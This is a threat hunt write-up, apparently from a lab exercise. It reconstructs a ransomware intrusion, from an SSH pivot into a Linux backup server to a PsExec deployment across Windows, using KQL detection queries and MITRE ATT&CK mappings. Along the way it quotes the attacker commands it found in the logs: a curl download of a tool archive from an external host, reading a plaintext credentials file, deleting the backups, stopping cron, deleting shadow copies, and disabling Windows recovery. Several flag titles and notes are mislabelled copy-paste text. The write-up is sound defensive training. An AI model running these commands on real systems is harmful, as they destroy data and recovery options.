# 🕵️‍♂️ Threat Hunt Report: Dead In The Water

## 🎯 Scenario
One week after an initial compromise, the organization returns from the weekend to a worst case scenario: ransom notes across every system. This was not a smash and grab operation. The attackers spent days methodically dismantling recovery capabilities before deploying ransomware. 

  <ins>This threat hunt reconstructs how the attackers:<ins>
- Pivoted into backup infrastructure
- Destroyed recovery data
- Rapidly deployed ransomware across Windows systems
- Disabled every viable recovery mechanism

---

## 🛠️ Investigation Environment

- **SIEM Platform:** Microsoft Log Analytics Workspace  
- **Query Language:** Kusto Query Language (KQL)
- **Primary Focus:** Backup infrastructure compromise and ransomware deployment

  ---

## 🐧 PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)

  ---
##  🚩 Flag 1: Lateral Movement - Remote Access 

**Objective**: Identify the remote access command used to pivot into backup infrastructure.

Under MITRE ATT&CK T1021.004 (Remote Services: SSH), the command ssh backup-admin@10.1.0.189 was executed, indicating remote access to the backup server using the backup-admin account. This activity occurred at 2025-11-20T14:19:46.1092202Z and reflects lateral movement via authenticated SSH access.

<img width="690" height="28" alt="image" src="https://github.com/user-attachments/assets/e2b51c76-7e7f-4129-ab53-1963c664e701" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName =~ "adminpc"
| where FileName == "ssh.exe"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| order by Timestamp dsc
```

**Notes:** This SSH connection represents the attacker’s pivot from a compromised workstation into critical backup infrastructure.

---

##  🚩 Flag 2: Attack Source Identification

**Objective**: Identify the IP address that initiated the SSH connection.

Under MITRE ATT&CK T1021.004 (Remote Services: SSH), investigation identified 10.1.0.108 as the source IP that initiated the SSH connection. This activity was recorded at 2025-11-25T05:39:22.191096Z, indicating authenticated remote access consistent with lateral movement behavior.

<img width="760" height="31" alt="image" src="https://github.com/user-attachments/assets/138e1def-c17c-4e20-8ed5-61446849318e" />

**KQL Query**:
```kql
DeviceProcessEvents
DeviceLogonEvents
| where DeviceName contains "BackupSrv"
| where LogonType == "Network"
| project Timestamp, DeviceName, RemoteIP, AccountName, ActionType
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| order by Timestamp dsc
```

**Notes:** Identifying the originating IP allows defenders to isolate the compromised host and understand lateral movement paths.

---

##  🚩 Flag 3: Compromised Account 

**Objective**: Identify the account used to access the backup server.

Under MITRE ATT&CK T1078.002 (Valid Accounts: Domain Accounts), analysis confirmed that the **backup-admin** account was used to access the backup server. The SSH syntax (username@host) directly reveals the compromised administrative account, indicating abuse of valid credentials with elevated backup privileges.

---

##  🚩 Flag 4: Directory Enumeration

**Objective**: Determine how attackers identified backup locations.

Under MITRE ATT&CK T1083 (File and Directory Discovery), the command **ls --color=auto -la /backups/** was executed, indicating that the attacker enumerated files and directories within the backup location. This activity occurred at 2025-11-25T05:47:51.749736Z and reflects reconnaissance efforts to identify accessible backup data and assess its contents.

<img width="783" height="180" alt="image" src="https://github.com/user-attachments/assets/43c4fea3-f68b-432a-a73e-110d1fd36fdb" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "Backupsrv"
| where ActionType == "ProcessCreated"
| where FileName == "ls"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| order by Timestamp desc
```

**Notes:** This command confirms attackers were mapping backup locations to identify targets for destruction.

---

##  🚩 Flag 5: Backup Archive Discovery

**Objective**: Identify how attackers searched for backup archives.

Under MITRE ATT&CK T1083 (File and Directory Discovery), the command *find /backups -name *.tar.gz** was executed, indicating that the attacker searched the backup directory for compressed archive files. This activity reflects reconnaissance behavior aimed at identifying valuable backup data for potential exfiltration or destruction.

<img width="806" height="165" alt="image" src="https://github.com/user-attachments/assets/49bbc710-8ecf-48c6-8b13-333912217b27" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "BackupSrv"
| where FileName == "find"
| where ProcessCommandLine has_any ("tar", ".tar", ".tar.gz", ".tgz")
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| order by Timestamp dsc
```

**Notes:** Searching for compressed archives indicates intent to locate high-value backup data.

---

##  🚩 Flag 6 – Account Enumeration

**Objective**: Identify how local accounts were enumerated.

Under MITRE ATT&CK T1087.001 (Account Discovery: Local Accounts), local accounts were enumerated using the command **cat /etc/passwd**. This activity allowed the attacker to list system and user accounts on the host, supporting further reconnaissance and potential privilege escalation.

<img width="943" height="175" alt="image" src="https://github.com/user-attachments/assets/8bb8646e-f82b-449c-b016-cc4fa4786944" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "BackupSrv"
| where ProcessCommandLine contains "/etc/passwd"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, FileName, ProcessCommandLine
| order by Timestamp dsc
```

**Notes:** Enumerating local accounts allows attackers to identify privileged users and potential persistence targets.

---

##  🚩 Flag 7: Scheduled Job Reconnaissance

**Objective**: Identify how backup schedules were discovered.

Under MITRE ATT&CK T1083 (File and Directory Discovery), backup schedules were discovered by executing the command cat **/etc/crontab**. This activity enabled the attacker to review scheduled tasks, including backup jobs, to understand timing and operational patterns that could be leveraged for further attack actions.

<img width="775" height="125" alt="image" src="https://github.com/user-attachments/assets/72226c83-e5c3-41b6-b27c-95c2d6bdb8b3" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "BackupSrv"
| where ProcessCommandLine contains "cron"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| order by Timestamp dsc
```

**Notes:** Understanding backup schedules helps attackers time destructive actions for maximum impact.

---

##  🚩 Flag 8: External Tool Download

**Objective**: Identify tools downloaded from external infrastructure.

Under MITRE ATT&CK T1105 (Ingress Tool Transfer), an external tool was downloaded using the command *curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z*. This activity indicates the transfer of a potentially malicious archive from external infrastructure to the compromised host for use in subsequent attack stages.

<img width="808" height="140" alt="image" src="https://github.com/user-attachments/assets/20839ffd-69d9-4024-9a04-93bd48bd5974" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "BackupSrv"
| where FileName in ("curl", "wget")
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** Downloading tools externally confirms preparation for destructive actions rather than opportunistic behavior.

---

##  🚩 Flag 9: Credential Theft

**Objective**: Identify access to stored credentials.

Under MITRE ATT&CK T1552.001 (Unsecured Credentials in Files), stored credentials were accessed using the command **cat /backups/configs/all-credentials.txt**. This activity indicates that sensitive authentication information was exposed in plaintext files, enabling the attacker to harvest credentials for further compromise.

<img width="1011" height="168" alt="image" src="https://github.com/user-attachments/assets/1c363685-d34e-481f-97d1-45b085de5969" />

**KQL Query**:
```kql
DeviceProcessEvents
| where AccountName == "backup-admin"
| where FileName == "cat"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** Accessing stored credentials enabled further lateral movement and escalation.

---

##  🚩 Flag 10: Backup Destruction

**Objective**: Identify the command that destroyed backup data.

Under MITRE ATT&CK T1485 (Data Destruction), backup data was destroyed through the execution of the command **rm -rf /backups/archives**. This action resulted in the recursive and irreversible deletion of archived backup files, indicating a deliberate attempt to disrupt recovery capabilities and cause operational impact.

<img width="783" height="62" alt="image" src="https://github.com/user-attachments/assets/d433686d-535c-4c6f-a27a-560fc99fb2b3" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "BackupSrv"
| where ProcessCommandLine startswith "rm -rf /backups/"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:**  Deleting backup directories ensured recovery was no longer possible.

---

##  🚩 Flag 11: Backup Service Stopped

**Objective**: Identify services stopped to disrupt backups.

Under MITRE ATT&CK T1489 (Service Stop), backup operations were disrupted by executing the command **systemctl stop cron**. This action halted the cron scheduling service, preventing scheduled backup tasks from running and further degrading system recovery capabilities.

<img width="788" height="150" alt="image" src="https://github.com/user-attachments/assets/dec6e98a-417e-43b6-8265-25561dfb95ec" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "BackupSrv"
| where ProcessCommandLine contains "stop"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:**  Stopping cron immediately halted scheduled backup jobs.

---

##  🚩 Flag 12: External Tool Download

**Objective**: Identify services stopped to disrupt backups.

Under MITRE ATT&CK T1489 (Service Stop), services were permanently disabled by executing the command systemctl disable cron. This action prevented the cron service from starting on system reboot, ensuring that scheduled tasks including backup operations remained inactive and reinforcing sustained disruption.

<img width="792" height="140" alt="image" src="https://github.com/user-attachments/assets/bdad728d-f56d-4c35-bffc-24fd9d977c36" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "BackupSrv"
| where ProcessCommandLine contains "disable"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:**  Disabling the service ensured backups would not resume after reboot.

---

## 💻 PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)

---

##  🚩 Flag 13: Remote Execution Tool

**Objective**: Identify the tool used to deploy ransomware.

Under MITRE ATT&CK T1021.002 (Remote Services: SMB / Windows Admin Shares), analysis identified PsExec64.exe as the tool used to deploy ransomware. This utility enabled remote command execution over SMB administrative shares, facilitating lateral movement and coordinated ransomware deployment across Windows systems.


<img width="791" height="101" alt="image" src="https://github.com/user-attachments/assets/288726d9-7cd4-4263-a38e-d000ce34729c" />


**KQL Query**:
```kql
DeviceProcessEvents
| where FileName startswith "PsExec"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:**  Disabling the service ensured backups would not resume after reboot.

---

##  🚩 Flag 14: Deployment Command

**Objective**: Identify the full ransomware deployment command.

Under MITRE ATT&CK T1021.002 (Remote Services: SMB / Windows Admin Shares), the full ransomware deployment command was identified as
**PsExec64.exe \\10.1.0.102 -u kenji.sato -p ******** -c -f C:\Windows\Temp\cache\silentlynx.exe**.
This command demonstrates the use of PsExec to remotely execute the ransomware payload on the target host 10.1.0.102 via SMB administrative shares, leveraging compromised credentials to copy and forcibly run the malicious executable.

<img width="682" height="120" alt="image" src="https://github.com/user-attachments/assets/37517bda-227a-4a6c-b49d-d031bd021050" />

**KQL Query**:
```kql
DeviceProcessEvents
| where FileName startswith "PsExec"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** The command reveals the target system, compromised credentials, and deployed ransomware payload.

---

##  🚩 Flag 15: Malicious Payload

**Objective**: Identifying the payload enables threat hunting across the environment.

Identifying the payload enables effective threat hunting across the environment. Under MITRE ATT&CK T1204.002 (User Execution: Malicious File), analysis confirmed that the deployed payload was **silentlynx.exe**, which was executed as part of the attack chain to carry out malicious activity across affected systems.

**KQL Query**:
```kql
DeviceProcessEvents
| where FileName startswith "PsExec"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```
---

## 🔥 PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)

---
##  🚩 Flag 16: Shadow Copy Service Stopped

**Objective**: Ransomware stops backup services to prevent recovery during encryption.

Under MITRE ATT&CK T1490 (Inhibit System Recovery), the attacker executed the command **net stop VSS /y**, forcibly stopping the Volume Shadow Copy Service. This action prevented the creation and use of shadow copies, effectively inhibiting system recovery and hindering restoration efforts following the attack.

<img width="795" height="156" alt="image" src="https://github.com/user-attachments/assets/77724f6a-fe4f-4ece-b6da-4a7310434a55" />

**KQL Query**:
```kql
DeviceProcessEvents
| where ProcessCommandLine has_all ("net", "stop", "vss")
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** Stopping VSS prevents restoration from shadow copies.

---

##  🚩 Flag 17: Backup Engine Stopped

**Objective**: Stopping backup engines prevents backup operations during the attack.

Under MITRE ATT&CK T1490 (Inhibit System Recovery), the attacker executed the command **net stop wbengine /y** , which stopped the Windows Backup Engine service. This action disrupted backup operations and further inhibited system recovery, increasing the impact of the attack by preventing restoration from recent backups.

<img width="785" height="166" alt="image" src="https://github.com/user-attachments/assets/d36004b8-9d13-4b60-9918-8e3fcecb770b" />

**KQL Query**:
```kql
DeviceProcessEvents
| where ProcessCommandLine has_all ("net", "stop", "wbengine")
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** This prevents Windows Backup from functioning during encryption.

---

##  🚩 Flag 18: Process Termination

**Objective**: Certain processes lock files and must be terminated before encryption can succeed.

Under MITRE ATT&CK T1562.001 (Impair Defenses: Disable or Modify Tools), the attacker executed the command taskkill /F /IM sqlservr.exe to forcibly terminate the SQL Server process. Stopping this process released file locks that could interfere with encryption, enabling the ransomware to access and encrypt database files while simultaneously impairing defensive and operational capabilities.

<img width="720" height="162" alt="image" src="https://github.com/user-attachments/assets/f25a4031-c242-4c69-9b4b-1191b6b876b9" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName =~ "taskkill.exe"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** Terminating processes unlocks files for encryption.

---

##  🚩 Flag 19: Recovery Point Deletion

**Objective**: Recovery points enable rapid file recovery without external backups.

Under MITRE ATT&CK T1490 (Inhibit System Recovery), the attacker executed the command vssadmin delete shadows /all /quiet, which permanently deleted all Volume Shadow Copy recovery points. This action eliminated local recovery options, significantly hindering system restoration and amplifying the overall impact of the attack.

<img width="785" height="166" alt="image" src="https://github.com/user-attachments/assets/b8554ce6-b1bc-442b-8c25-4cf89c765e28" />


**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName contains "admin" 
| where FileName =~ "vssadmin.exe"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** Deletes all existing restore points silently.



---

##  🚩 Flag 20: Recovery Storage Limited

**Objective**: Limiting storage prevents new recovery points from being created.

Under MITRE ATT&CK T1490 (Inhibit System Recovery), the attacker executed the command vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB, drastically limiting the storage allocated for Volume Shadow Copies. This action prevented the creation of new recovery points, further inhibiting system recovery and increasing the destructive impact of the attack.

<img width="688" height="103" alt="image" src="https://github.com/user-attachments/assets/01485089-cd83-4ea3-bf1b-133d13e88431" />

**KQL Query**:
```kql
DeviceProcessEvents
| where FileName =~ "vssadmin.exe"
| where ProcessCommandLine has "resize"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** Disables Windows recovery options entirely.

---

##  🚩 Flag 21: System Recovery Disabled

**Objective**: Windows recovery features enable automatic system repair after corruption.

Under MITRE ATT&CK T1490 (Inhibit System Recovery), the attacker executed the command bcdedit /set {default} recoveryenabled No, which disabled Windows recovery features. This action prevented automatic system repair following system corruption, further inhibiting recovery and increasing the overall impact of the attack.

<img width="507" height="97" alt="image" src="https://github.com/user-attachments/assets/b1b37d0b-62ef-4e7f-a180-393e3f1d5722" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName =~ "bcdedit.exe"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc

```

**Notes:** Terminating processes unlocks files for encryption.

---

##  🚩 Flag 22: Backup Catalog Deleted

**Objective**: Ransomware stops backup services to prevent recovery during encryption.

Under MITRE ATT&CK T1490 (Inhibit System Recovery), the attacker executed the command wbadmin delete catalog -quiet, which deleted the Windows Backup catalog. This action removed records of available restore points and backup versions, further preventing system recovery and amplifying the destructive impact of the attack.

<img width="772" height="170" alt="image" src="https://github.com/user-attachments/assets/2b8bfd1c-35fd-4e3d-9b8d-50f229571baf" />

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName =~ "wbadmin.exe"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp asc
```

**Notes:** Terminating processes unlocks files for encryption.

---

##  🚩 Flag 23: Registry Persistence

**Objective**: Ransomware stops backup services to prevent recovery during encryption.

**KQL Query**:
```kql
DeviceRegistryEvents
| where DeviceName == "azuki-adminpc"
| where RegistryKey has @"CurrentVersion\Run"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
| order by Timestamp asc
```

**Notes:** Registry autoruns ensure malware execution on startup.

---

##  🚩 Flag 24: Scheduled Task Persistence

**Objective**: Ransomware stops backup services to prevent recovery during encryption.

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName =~ "schtasks.exe"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp asc
```

**Notes:** Scheduled tasks provide reliable, long-term persistence.

---

##  🚩 Flag 25: Anti-Forensics

**Objective**: Ransomware stops backup services to prevent recovery during encryption.

**KQL Query**:
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where FileName =~ "fsutil.exe"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| project Timestamp, DeviceName, ProcessCommandLine, AccountName
| order by Timestamp dsc
```

**Notes:** Deleting the USN journal removes forensic evidence of file changes.

---

##  🚩 Flag 26: Ransom Note

**Objective**: Ransomware stops backup services to prevent recovery during encryption.

**KQL Query**:
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where FileName endswith ".txt"
| where ActionType == "FileCreated"
| where Timestamp >= datetime(2025-11-01)
| where Timestamp < datetime(2025-12-01)
| order by Timestamp dsc
```
**Notes:** The presence of the ransom note confirms successful encryption across systems.

---
